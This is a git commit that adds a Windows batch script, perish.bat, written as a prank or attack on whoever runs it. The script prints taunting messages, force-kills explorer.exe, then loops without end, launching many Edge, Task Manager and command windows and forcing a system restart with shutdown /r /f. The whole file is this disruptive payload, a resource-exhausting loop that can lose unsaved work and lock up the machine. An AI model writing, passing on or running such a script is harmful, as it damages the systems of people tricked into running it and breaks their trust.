172980f28460a32fd9087649887092f0d73f1453
polartest127 <eieieiimonvacation2@gmail.com>
2026-02-14 20:10:57 +0000

    Add files via upload

---
+++ perish.bat
@@ -0,0 +1,24 @@
+@echo off
+color 02
+
+echo YOUR PC HAS BEEN FUCKED
+echo ez fat kid
+echo ready for the nuke?
+start msedge
+start taskmgr
+taskkill /f explorer.exe
+
+:loop
+start msedge
+start taskmgr
+start
+start msedge
+start msedge
+start msedge
+start msedge
+start msedge
+shutdown /r /f /t 33
+
+goto loop
+
+
